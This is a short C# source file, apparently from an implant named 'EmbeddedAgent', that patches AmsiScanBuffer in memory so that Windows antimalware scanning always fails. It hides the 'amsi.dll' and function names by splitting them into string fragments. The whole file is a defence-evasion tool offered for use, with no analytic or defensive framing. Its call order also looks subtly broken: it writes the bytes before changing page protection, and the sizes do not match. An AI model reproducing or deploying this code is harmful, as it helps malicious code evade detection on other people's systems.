using System.Runtime.InteropServices;

namespace EmbeddedAgent
{
    public class ByPassAV
    {

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr hpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static void Copy(Byte[] patch, IntPtr address)
        {
            Marshal.Copy(patch, 0, address, 6);
        }

        public static void Evade()
        {
            uint p;
            IntPtr library = LoadLibrary("a" + "m" + "s" + "i" + ".dll");
            IntPtr address = GetProcAddress(library, "Amsi" + "Scan" + "Buffer");
            Byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

            Copy(patch, address);
            VirtualProtect(address, (UIntPtr)5, 0x40, out p);
        }


    }
}
